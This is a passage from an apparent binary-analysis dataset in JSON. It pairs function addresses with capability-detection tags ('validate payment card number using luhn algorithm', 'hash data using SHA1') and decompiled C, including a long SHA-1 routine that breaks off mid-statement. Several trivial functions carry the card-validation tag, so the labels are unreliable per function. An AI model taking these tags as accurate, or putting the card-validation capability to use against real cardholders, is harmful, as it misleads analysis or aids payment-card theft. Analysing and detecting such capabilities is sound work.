        "decompiled_code": "\nvoid __cdecl fcn.00083965(int32_t *arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    int32_t in_ECX;\n    uint var_8h;\n    \n    *(in_ECX + 4) = **arg_8h;\n    arg_8h_00 = *(*arg_8h + 4);\n    uVar1 = fcn.0008f56d(arg_8h_00);\n    fcn.000831fd(uVar1);\n    fcn.000858fb();\n    *(in_ECX + 0x10) = *(arg_8h_00 + 8 + *arg_8h);\n    *(in_ECX + 0xc) = *(arg_8h_00 + 0xc + *arg_8h);\n    uVar1 = fcn.00082c1e(&var_8h, arg_8h_00 + 0x14, *(arg_8h_00 + 0x10 + *arg_8h));\n    fcn.00082c65(uVar1);\n    fcn.00082dff();\n    return;\n}\n",
        "token_count": 257
    },
    "00083ae6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00083ae6(uint *param_1)\n\n{\n    *param_1 = 0x9257c;\n    param_1[1] = 0x92584;\n    if (param_1[2] != 0) {\n        fcn.00085944();\n    }\n    param_1[2] = 0;\n    return;\n}\n",
        "token_count": 84
    },
    "000840f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000840f5(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uchar auStack68 [36];\n    uint uStack32;\n    uint uStack28;\n    uchar auStack24 [16];\n    \n    uStack32 = 3;\n    arg_ch = 0;\n    uStack28 = 0;\n    auStack24 = ZEXT816(0);\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            puVar1 = fcn.000816d5(auStack68, arg_ch);\n            fcn.00083506(*puVar1);\n            fcn.000813b6();\n            iVar2 = fcn.000816d5(auStack68, arg_ch);\n            fcn.00083527(iVar2 + 4);\n            fcn.000813b6();\n            iVar2 = fcn.000816d5(auStack68, arg_ch);\n            fcn.00083527(iVar2 + 8);\n            fcn.000813b6();\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0xc));\n    }\n    fcn.0008343f(arg_8h);\n    fcn.0008342b();\n    return arg_8h;\n}\n",
        "token_count": 312
    },
    "000841af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.000841af(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 0x925dc;\n    if (param_1[1] != 0) {\n        for (iVar1 = *(param_1[1] + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n            fcn.000813b6();\n        }\n    }\n    param_1[1] = 0;\n    param_1[3] = 0;\n    param_1[2] = 0;\n    return;\n}\n",
        "token_count": 134
    },
    "000841eb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000841eb(int32_t arg_8h)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    \n    *in_ECX = 0x925dc;\n    fcn.000812ba(&arg_8h);\n    if (arg_8h != 0) {\n        for (iVar1 = *(arg_8h + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n            fcn.000813b6();\n        }\n    }\n    return;\n}\n",
        "token_count": 119
    },
    "00084577": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.00084577(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint uVar2;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    uVar1 = *(in_ECX + 8);\n    arg_8h_00 = in_ECX + 4;\n    uVar2 = arg_8h;\n    fcn.00083527(arg_8h_00);\n    fcn.00083506(arg_8h_00);\n    fcn.0008343f(arg_8h_00);\n    fcn.0008342b(arg_8h_00, uVar1, uVar2, 0xf, 0, ZEXT816(0));\n    return arg_8h;\n}\n",
        "token_count": 243
    },
    "0008589c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0008589c(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t arg_8h;\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = 0;\n    arg_8h = 0;\n    if (param_1 != 0) {\n        arg_8h = fcn.00085858();\n    }\n    if (param_2 != 0) {\n        iVar1 = fcn.0008590a();\n        if (param_1 == 0) {\n            return iVar1;\n        }\n        if ((iVar1 != 0) && (arg_8h != 0)) {\n            if (param_2 < arg_8h) {\n                arg_8h = param_2;\n            }\n            fcn.00085985(arg_8h);\n        }\n    }\n    if (param_1 != 0) {\n        fcn.000858fb();\n    }\n    return iVar1;\n}\n",
        "token_count": 223
    },
    "00085ced": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using SHA1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00085ced(uint32_t *param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    uint32_t uVar22;\n    uint32_t uVar23;\n    uint32_t uVar24;\n    uint32_t uVar25;\n    uint32_t var_9ch;\n    uint32_t var_98h;\n    uint32_t var_94h;\n    uint32_t var_90h;\n    uint32_t var_8ch;\n    uint32_t var_88h;\n    uint32_t var_84h;\n    uint32_t var_80h;\n    uint32_t var_7ch;\n    uint32_t var_78h;\n    uint32_t var_74h;\n    uint32_t var_70h;\n    uint32_t var_6ch;\n    uint32_t var_68h;\n    uint32_t var_64h;\n    uint32_t var_60h;\n    uint32_t *var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_5ch = param_1;\n    fcn.0008102c(&var_9ch, param_2, 0x40);\n    uVar13 = *param_1;\n    uVar8 = param_1[1];\n    uVar7 = var_9ch >> 8 & 0xff00ff00 | var_9ch << 0x18 | (var_9ch & 0xff00) << 8 | var_9ch >> 0x18;\n    uVar3 = uVar8 >> 2 | uVar8 << 0x1e;\n    uVar8 = uVar7 + 0x5a827999 +\n            ((var_5ch[3] ^ var_5ch[2]) & uVar8 ^ var_5ch[3]) + (uVar13 << 5 | uVar13 >> 0x1b) + param_1[4];\n    uVar12 = var_98h >> 8 & 0xff00ff00 | var_98h << 0x18 | (var_98h & 0xff00) << 8 | var_98h >> 0x18;\n    uVar18 = uVar13 >> 2 | uVar13 << 0x1e;\n    uVar13 = var_5ch[3] + 0x5a827999 +\n             ((var_5ch[2] ^ uVar3) & uVar13 ^ var_5ch[2]) + (uVar8 * 0x20 | uVar8 >> 0x1b) + uVar12;\n    uVar1 = var_94h >> 8 & 0xff00ff00 | var_94h << 0x18 | (var_94h & 0xff00) << 8 | var_94h >> 0x18;\n    uVar19 = var_5ch[2] + 0x5a827999 + ((uVar3 ^ uVar18) & uVar8 ^ uVar3) + (uVar13 * 0x20 | uVar13 >> 0x1b) + uVar1;\n    uVar8 = uVar8 >> 2 | uVar8 * 0x40000000;\n    uVar2 = var_90h >> 8 & 0xff00ff00 | var_90h << 0x18 | (var_90h & 0xff00) << 8 | var_90h >> 0x18;\n    uVar14 = uVar13 >> 2 | uVar13 * 0x40000000;\n    uVar13 = uVar3 + 0x5a827999 + ((uVar8 ^ uVar18) & uVar13 ^ uVar18) + (uVar19 * 0x20 | uVar19 >> 0x1b) + uVar2;\n    uVar3 = var_8ch >> 8 & 0xff00ff00 | var_8ch << 0x18 | (var_8ch & 0xff00) << 8 | var_8ch >> 0x18;\n    uVar20 = uVar19 >> 2 | uVar19 * 0x40000000;\n    uVar19 = (uVar8 ^ (uVar8 ^ uVar14) & uVar19) + (uVar13 * 0x20 | uVar13 >> 0x1b) + uVar3 + uVar18 + 0x5a827999;\n    uVar18 = var_88h >> 8 & 0xff00ff00 | var_88h << 0x18 | (var_88h & 0xff00) << 8 | var_88h >> 0x18;\n    uVar4 = uVar13 >> 2 | uVar13 * 0x40000000;\n    uVar8 = uVar8 + 0x5a827999 + ((uVar14 ^ uVar20) & uVar13 ^ uVar14) + (uVar19 * 0x20 | uVar19 >> 0x1b) + uVar18;\n    uVar13 = var_84h >> 8 & 0xff00ff00 | var_84h << 0x18 | (var_84h & 0xff00) << 8 | var_84h >> 0x18;\n    uVar9 = uVar19 >> 2 | uVar19 * 0x40000000;\n    uVar19 = (uVar8 * 0x20 | uVar8 >> 0x1b) + uVar13 + ((uVar20 ^ uVar4) & uVar19 ^ uVar20) + uVar14 + 0x5a827999;\n    uVar15 = var_80h >> 8 & 0xff00ff00 | var_80h << 0x18 | (var_80h & 0xff00) << 8 | var_80h >> 0x18;\n    uVar16 = uVar8 >> 2 | uVar8 * 0x40000000;\n    uVar8 = (uVar19 * 0x20 | uVar19 >> 0x1b) + uVar15 + ((uVar4 ^ uVar9) & uVar8 ^ uVar4) + uVar20 + 0x5a827999;\n    uVar21 = var_7ch >> 8 & 0xff00ff00 | var_7ch << 0x18 | (var_7ch & 0xff00) << 8 | var_7ch >> 0x18;\n    uVar22 = uVar19 >> 2 | uVar19 * 0x40000000;\n    uVar19 = (uVar8 * 0x20 | uVar8 >> 0x1b) + uVar21 + ((uVar16 ^ uVar9) & uVar19 ^ uVar9) + uVar4 + 0x5a827999;\n    uVar5 = var_78h >> 8 & 0xff00ff00 | var_78h << 0x18 | (var_78h & 0xff00) << 8 | var_78h >> 0x18;\n    uVar14 = uVar8 >> 2 | uVar8 * 0x40000000;\n    uVar4 = (uVar19 * 0x20 | uVar19 >> 0x1b) + uVar5 + ((uVar16 ^ uVar22) & uVar8 ^ uVar16) + uVar9 + 0x5a827999;\n    uVar10 = var_74h >> 8 & 0xff00ff00 | var_74h << 0x18 | (var_74h & 0xff00) << 8 | var_74h >> 0x18;\n    uVar20 = uVar19 >> 2 | uVar19 * 0x40000000;\n    uVar16 = uVar16 + 0x5a827999 + ((uVar22 ^ uVar14) & uVar19 ^ uVar22) + (uVar4 * 0x20 | uVar4 >> 0x1b) + uVar10;\n    uVar8 = uVar16 >> 2 | uVar16 * 0x40000000;\n    uVar19 = var_70h >> 8 & 0xff00ff00 | var_70h << 0x18 | (var_70h & 0xff00) << 8 | var_70h >> 0x18;\n    uVar9 = (uVar14 ^ (uVar14 ^ uVar20) & uVar4) + (uVar16 * 0x20 | uVar16 >> 0x1b) + uVar19 + uVar22 + 0x5a827999;\n    uVar22 = uVar4 >> 2 | uVar4 * 0x40000000;\n    uVar4 = var_6ch >> 8 & 0xff00ff00 | var_6ch << 0x18 | (var_6ch & 0xff00) << 8 | var_6ch >> 0x18;\n    uVar16 = (uVar16 & (uVar20 ^ uVar22) ^ uVar20) + (uVar9 * 0x20 | uVar9 >> 0x1b) + uVar4 + uVar14 + 0x5a827999;\n    uVar14 = var_68h >> 8 & 0xff00ff00 | var_68h << 0x18 | (var_68h & 0xff00) << 8 | var_68h >> 0x18;\n    uVar6 = uVar9 >> 2 | uVar9 * 0x40000000;\n    uVar23 = (uVar22 ^ (uVar8 ^ uVar22) & uVar9) + (uVar16 * 0x20 | uVar16 >> 0x1b) + uVar14 + uVar20 + 0x5a827999;\n    uVar9 = var_64h >> 8 & 0xff00ff00 | var_64h << 0x18 | (var_64h & 0xff00) << 8 | var_64h >> 0x18;\n    uVar17 = uVar16 >> 2 | uVar16 * 0x40000000;\n    uVar11 = (uVar8 ^ (uVar8 ^ uVar6) & uVar16) + (uVar23 * 0x20 | uVar23 >> 0x1b) + uVar9 + uVar22 + 0x5a827999;\n    uVar20 = var_60h >> 8 & 0xff00ff00 | var_60h << 0x18 | (var_60h & 0xff00) << 8 | var_60h >> 0x18;\n    uVar7 = uVar14 ^ uVar21 ^ uVar1 ^ uVar7;\n    uVar16 = uVar7 << 1 | uVar7 < 0;\n    uVar8 = (uVar6 ^ (uVar6 ^ uVar17) & uVar23) + (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar20 + uVar8 + 0x5a827999;\n    uVar24 = uVar23 >> 2 | uVar23 * 0x40000000;\n    uVar12 = uVar9 ^ uVar5 ^ uVar2 ^ uVar12;\n    uVar22 = uVar12 << 1 | uVar12 < 0;\n    uVar7 = (uVar17 ^ (uVar17 ^ uVar24) & uVar11) + (uVar8 * 0x20 | uVar8 >> 0x1b) + uVar16 + uVar6 + 0x5a827999;\n    uVar12 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar1 = uVar20 ^ uVar10 ^ uVar3 ^ uVar1;\n    uVar6 = uVar1 << 1 | uVar1 < 0;\n    uVar17 = (uVar24 ^ (uVar24 ^ uVar12) & uVar8) + (uVar7 * 0x20 | uVar7 >> 0x1b) + uVar22 + uVar17 + 0x5a827999;\n    uVar1 = uVar8 >> 2 | uVar8 * 0x40000000;\n    uVar23 = uVar7 >> 2 | uVar7 * 0x40000000;\n    uVar8 = uVar19 ^ uVar18 ^ uVar2 ^ uVar16;\n    uVar11 = (uVar12 ^ (uVar1 ^ uVar12) & uVar7) + (uVar17 * 0x20 | uVar17 >> 0x1b) + uVar6 + uVar24 + 0x5a827999;\n    uVar8 = uVar8 << 1 | uVar8 < 0;\n    uVar24 = uVar17 >> 2 | uVar17 * 0x40000000;\n    uVar7 = uVar4 ^ uVar13 ^ uVar3 ^ uVar22;\n    uVar7 = uVar7 << 1 | uVar7 < 0;\n    uVar2 = (uVar1 ^ (uVar1 ^ uVar23) & uVar17) + (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar8 + uVar12 + 0x5a827999;\n    uVar17 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar12 = uVar14 ^ uVar15 ^ uVar18 ^ uVar6;\n    uVar12 = uVar12 << 1 | uVar12 < 0;\n    uVar18 = (uVar23 ^ uVar24 ^ uVar11) + (uVar2 * 0x20 | uVar2 >> 0x1b) + uVar7 + uVar1 + 0x6ed9eba1;\n    uVar3 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar13 = uVar9 ^ uVar21 ^ uVar13 ^ uVar8;\n    uVar13 = uVar13 << 1 | uVar13 < 0;\n    uVar2 = (uVar24 ^ uVar17 ^ uVar2) + (uVar18 * 0x20 | uVar18 >> 0x1b) + uVar12 + uVar23 + 0x6ed9eba1;\n    uVar23 = uVar18 >> 2 | uVar18 * 0x40000000;\n    uVar1 = uVar20 ^ uVar5 ^ uVar15 ^ uVar7;\n    uVar1 = uVar1 << 1 | uVar1 < 0;\n    uVar11 = (uVar17 ^ uVar18 ^ uVar3) + (uVar2 * 0x20 | uVar2 >> 0x1b) + uVar13 + uVar24 + 0x6ed9eba1;\n    uVar18 = uVar17 + 0x6ed9eba1 + (uVar23 ^ uVar2 ^ uVar3) + (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar1;\n    uVar24 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar2 = uVar10 ^ uVar21 ^ uVar12 ^ uVar16;\n    uVar2 = uVar2 << 1 | uVar2 < 0;\n    uVar15 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar11 = (uVar18 * 0x20 | uVar18 >> 0x1b) + uVar2 + (uVar23 ^ uVar24 ^ uVar11) + uVar3 + 0x6ed9eba1;\n    uVar3 = uVar19 ^ uVar5 ^ uVar13 ^ uVar22;\n    uVar3 = uVar3 << 1 | uVar3 < 0;\n    uVar17 = uVar18 >> 2 | uVar18 * 0x40000000;\n    uVar5 = (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar3 + (uVar24 ^ uVar15 ^ uVar18) + uVar23 + 0x6ed9eba1;\n    uVar18 = uVar4 ^ uVar10 ^ uVar1 ^ uVar6;\n    uVar18 = uVar18 << 1 | uVar18 < 0;\n    uVar23 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar11 = (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar18 + (uVar15 ^ uVar17 ^ uVar11) + uVar24 + 0x6ed9eba1;\n    uVar19 = uVar14 ^ uVar19 ^ uVar2 ^ uVar8;\n    uVar19 = uVar19 << 1 | uVar19 < 0;\n    uVar21 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar5 = (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar19 + (uVar5 ^ uVar17 ^ uVar23) + uVar15 + 0x6ed9eba1;\n    uVar4 = uVar9 ^ uVar4 ^ uVar3 ^ uVar7;\n    uVar4 = uVar4 << 1 | uVar4 < 0;\n    uVar17 = (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar4 + (uVar21 ^ uVar11 ^ uVar23) + uVar17 + 0x6ed9eba1;\n    uVar14 = uVar20 ^ uVar14 ^ uVar18 ^ uVar12;\n    uVar14 = uVar14 << 1 | uVar14 < 0;\n    uVar15 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar10 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar11 = (uVar17 * 0x20 | uVar17 >> 0x1b) + uVar14 + (uVar21 ^ uVar15 ^ uVar5) + uVar23 + 0x6ed9eba1;\n    uVar9 = uVar9 ^ uVar19 ^ uVar13 ^ uVar16;\n    uVar9 = uVar9 << 1 | uVar9 < 0;\n    uVar23 = uVar17 >> 2 | uVar17 * 0x40000000;\n    uVar5 = (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar9 + (uVar15 ^ uVar10 ^ uVar17) + uVar21 + 0x6ed9eba1;\n    uVar20 = uVar20 ^ uVar4 ^ uVar1 ^ uVar22;\n    uVar20 = uVar20 << 1 | uVar20 < 0;\n    uVar21 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar11 = (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar20 + (uVar10 ^ uVar23 ^ uVar11) + uVar15 + 0x6ed9eba1;\n    uVar16 = uVar14 ^ uVar2 ^ uVar6 ^ uVar16;\n    uVar16 = uVar16 << 1 | uVar16 < 0;\n    uVar17 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar5 = (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar16 + (uVar5 ^ uVar23 ^ uVar21) + uVar10 + 0x6ed9eba1;\n    uVar22 = uVar9 ^ uVar3 ^ uVar8 ^ uVar22;\n    uVar22 = uVar22 << 1 | uVar22 < 0;\n    uVar10 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar11 = (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar22 + (uVar17 ^ uVar11 ^ uVar21) + uVar23 + 0x6ed9eba1;\n    uVar6 = uVar20 ^ uVar18 ^ uVar7 ^ uVar6;\n    uVar6 = uVar6 << 1 | uVar6 < 0;\n    uVar23 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar5 = (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar6 + (uVar17 ^ uVar10 ^ uVar5) + uVar21 + 0x6ed9eba1;\n    uVar8 = uVar19 ^ uVar12 ^ uVar8 ^ uVar16;\n    uVar8 = uVar8 << 1 | uVar8 < 0;\n    uVar24 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar11 = (uVar10 ^ uVar23 ^ uVar11) + (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar8 + uVar17 + 0x6ed9eba1;\n    uVar7 = uVar4 ^ uVar13 ^ uVar7 ^ uVar22;\n    uVar17 = uVar7 << 1 | uVar7 < 0;\n    uVar15 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar5 = (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar17 + (uVar23 ^ uVar24 ^ uVar5) + uVar10 + 0x6ed9eba1;\n    uVar7 = uVar14 ^ uVar1 ^ uVar12 ^ uVar6;\n    uVar7 = uVar7 << 1 | uVar7 < 0;\n    uVar10 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar11 = (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar7 + (uVar11 ^ uVar24 ^ uVar15) + uVar23 + 0x6ed9eba1;\n    uVar13 = uVar9 ^ uVar2 ^ uVar13 ^ uVar8;\n    uVar13 = uVar13 << 1 | uVar13 < 0;\n    uVar21 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar5 = (uVar11 * 0x20 | uVar11 >> 0x1b) + uVar13 + (uVar10 ^ uVar5 ^ uVar15) + uVar24 + 0x6ed9eba1;\n    uVar12 = uVar20 ^ uVar3 ^ uVar1 ^ uVar17;\n    uVar12 = uVar12 << 1 | uVar12 < 0;\n    uVar24 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar15 = (uVar10 ^ uVar21 ^ uVar11) + (uVar5 * 0x20 | uVar5 >> 0x1b) + uVar12 + uVar15 + 0x6ed9eba1;\n    uVar1 = uVar18 ^ uVar2 ^ uVar7 ^ uVar16;\n    uVar11 = uVar1 << 1 | uVar1 < 0;\n    uVar23 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar1 = (uVar15 * 0x20 | uVar15 >> 0x1b) + 0x8f1bbcdc +\n            ((uVar24 | uVar5) & uVar21 | uVar24 & uVar5) + uVar11 + uVar10;\n    uVar2 = uVar19 ^ uVar3 ^ uVar13 ^ uVar22;\n    uVar5 = uVar2 << 1 | uVar2 < 0;\n    uVar2 = (uVar1 * 0x20 | uVar1 >> 0x1b) + 0x8f1bbcdc +\n            ((uVar23 | uVar15) & uVar24 | uVar23 & uVar15) + uVar5 + uVar21;\n    uVar3 = uVar4 ^ uVar18 ^ uVar12 ^ uVar6;\n    uVar10 = uVar3 << 1 | uVar3 < 0;\n    uVar18 = uVar15 >> 2 | uVar15 * 0x40000000;\n    uVar3 = uVar14 ^ uVar19 ^ uVar11 ^ uVar8;\n    uVar15 = uVar3 << 1 | uVar3 < 0;\n    uVar3 = (uVar1 & uVar18 | (uVar1 | uVar18) & uVar23) + uVar10 + uVar24 + 0x8f1bbcdc + (uVar2 * 0x20 | uVar2 >> 0x1b)\n    ;\n    uVar24 = uVar1 >> 2 | uVar1 * 0x40000000;\n    uVar1 = (uVar3 * 0x20 | uVar3 >> 0x1b) + 0x8f1bbcdc + ((uVar24 | uVar2) & uVar18 | uVar24 & uVar2) + uVar15 + uVar23\n    ;\n    uVar19 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar2 = uVar9 ^ uVar4 ^ uVar5 ^ uVar17;\n    uVar23 = uVar2 << 1 | uVar2 < 0;\n    uVar2 = (uVar1 * 0x20 | uVar1 >> 0x1b) + 0x8f1bbcdc + ((uVar19 | uVar3) & uVar24 | uVar19 & uVar3) + uVar23 + uVar18\n    ;\n    uVar18 = uVar20 ^ uVar14 ^ uVar10 ^ uVar7;\n    uVar14 = uVar18 << 1 | uVar18 < 0;\n    uVar21 = uVar3 >> 2 | uVar3 * 0x40000000;\n    uVar25 = uVar1 >> 2 | uVar1 * 0x40000000;\n    uVar1 = (uVar2 * 0x20 | uVar2 >> 0x1b) + 0x8f1bbcdc + ((uVar21 | uVar1) & uVar19 | uVar21 & uVar1) + uVar14 + uVar24\n    ;\n    uVar3 = uVar9 ^ uVar15 ^ uVar13 ^ uVar16;\n    uVar9 = uVar3 << 1 | uVar3 < 0;\n    uVar3 = (uVar1 * 0x20 | uVar1 >> 0x1b) + 0x8f1bbcdc + ((uVar25 | uVar2) & uVar21 | uVar25 & uVar2) + uVar9 + uVar19;\n    uVar4 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar2 = uVar20 ^ uVar23 ^ uVar12 ^ uVar22;\n    uVar20 = uVar2 << 1 | uVar2 < 0;\n    uVar16 = uVar14 ^ uVar11 ^ uVar6 ^ uVar16;\n    uVar18 = uVar16 << 1 | uVar16 < 0;\n    uVar2 = (uVar1 & uVar4 | (uVar1 | uVar4) & uVar25) + uVar20 + uVar21 + 0x8f1bbcdc + (uVar3 * 0x20 | uVar3 >> 0x1b);\n    uVar16 = uVar1 >> 2 | uVar1 * 0x40000000;\n    uVar1 = (uVar2 * 0x20 | uVar2 >> 0x1b) + 0x8f1bbcdc + ((uVar16 | uVar3) & uVar4 | uVar16 & uVar3) + uVar18 + uVar25;\n    uVar24 = uVar3 >> 2 | uVar3 * 0x40000000;\n    uVar22 = uVar9 ^ uVar5 ^ uVar8 ^ uVar22;\n    uVar19 = uVar22 << 1 | uVar22 < 0;\n    uVar3 = (uVar1 * 0x20 | uVar1 >> 0x1b) + 0x8f1bbcdc + ((uVar24 | uVar2) & uVar16 | uVar24 & uVar2) + uVar19 + uVar4;\n    uVar6 = uVar20 ^ uVar10 ^ uVar17 ^ uVar6;\n    uVar22 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar4 = uVar6 << 1 | uVar6 < 0;\n    uVar21 = uVar1 >> 2 | uVar1 * 0x40000000;\n    uVar1 = (uVar3 * 0x20 | uVar3 >> 0x1b) + 0x8f1bbcdc + ((uVar22 | uVar1) & uVar24 | uVar22 & uVar1) + uVar4 + uVar16;\n    uVar8 = uVar15 ^ uVar7 ^ uVar8 ^ uVar18;\n    uVar16 = uVar8 << 1 | uVar8 < 0;\n    uVar8 = (uVar1 * 0x20 | uVar1 >> 0x1b) + 0x8f1bbcdc + ((uVar21 | uVar3) & uVar22 | uVar21 & uVar3) + uVar16 + uVar24\n    ;\n    uVar2 = uVar23 ^ uVar13 ^ uVar17 ^ uVar19;\n    uVar6 = uVar2 << 1 | uVar2 < 0;\n    uVar3 = uVar3 >> 2 | uVar3 * 0x40000000;\n    uVar7 = uVar14 ^ uVar12 ^ uVar7 ^ uVar4;\n    uVar17 = uVar7 << 1 | uVar7 < 0;\n    uVar7 = (uVar1 & uVar3 | (uVar1 | uVar3) & uVar21) + uVar6 + uVar22 + 0x8f1bbcdc + (uVar8 * 0x20 | uVar8 >> 0x1b);\n    uVar1 = uVar1 >> 2 | uVar1 * 0x40000000;\n    uVar2 = uVar8 >> 2 | uVar8 * 0x40000000;\n    uVar8 = (uVar7 * 0x20 | uVar7 >> 0x1b) + 0x8f1bbcdc + ((uVar1 | uVar8) & uVar3 | uVar1 & uVar8) + uVar17 + uVar21;\n    uVar13 = uVar9 ^ uVar11 ^ uVar13 ^ uVar16;\n    uVar21 = uVar13 << 1 | uVar13 < 0;\n    uVar22 = uVar7 >> 2 | uVar7 * 0x40000000;\n    uVar13 = (uVar8 * 0x20 | uVar8 >> 0x1b) + 0x8f1bbcdc + ((uVar2 | uVar7) & uVar1 | uVar2 & uVar7) + uVar21 + uVar3;\n    uVar7 = uVar20 ^ uVar5 ^ uVar12 ^ uVar6;\n    uVar24 = uVar7 << 1 | uVar7 < 0;\n    uVar7 = uVar8 >> 2 | uVar8 * 0x40000000;\n    uVar12 = (uVar13 * 0x20 | uVar13 >> 0x1b) + 0x8f1bbcdc +\n             ((uVar22 | uVar8) & uVar2 | uVar22 & uVar8) + uVar24 + uVar1;\n    uVar8 = uVar10 ^ uVar11 ^ uVar17 ^ uVar18;\n    uVar11 = uVar8 << 1 | uVar8 < 0;\n    uVar8 = uVar13 >> 2 | uVar13 * 0x40000000;\n    uVar1 = (uVar12 * 0x20 | uVar12 >> 0x1b) + 0x8f1bbcdc +\n            ((uVar7 | uVar13) & uVar22 | uVar7 & uVar13) + uVar11 + uVar2;\n    uVar13 = uVar15 ^ uVar5 ^ uVar21 ^ uVar19;\n    uVar5 = uVar13 << 1 | uVar13 < 0;\n    uVar2 = uVar12 >> 2 | uVar12 * 0x40000000;\n    uVar22 = (uVar1 * 0x20 | uVar1 >> 0x1b) + 0x8f1bbcdc + ((uVar12 | uVar8) & uVar7 | uVar12 & uVar8) + uVar5 + uVar22;\n    uVar13 = uVar23 ^ uVar10 ^ uVar24 ^ uVar4;\n    uVar13 = uVar13 << 1 | uVar13 < 0;\n    uVar12 = uVar14 ^ uVar15 ^ uVar11 ^ uVar16;\n    uVar12 = uVar12 << 1 | uVar12 < 0;\n    uVar15 = uVar1 >> 2 | uVar1 * 0x40000000;\n    uVar3 = (uVar22 * 0x20 | uVar22 >> 0x1b) + 0x8f1bbcdc + ((uVar2 | uVar1) & uVar8 | uVar2 & uVar1) + uVar13 + uVar7;\n    uVar7 = uVar9 ^ uVar23 ^ uVar5 ^ uVar6;\n    uVar7 = uVar7 << 1 | uVar7 < 0;\n    uVar1 = (uVar3 * 0x20 | uVar3 >> 0x1b) + ((uVar15 | uVar22) & uVar2 | uVar15 & uVar22) + 0x8f1bbcdc + uVar12 + uVar8\n    ;\n    uVar23 = uVar22 >> 2 | uVar22 * 0x40000000;\n    uVar10 = uVar3 >> 2 | uVar3 * 0x40000000;\n    uVar2 = (uVar1 * 0x20 | uVar1 >> 0x1b) + 0xca62c1d6 + (uVar15 ^ uVar23 ^ uVar3) + uVar7 + uVar2;\n    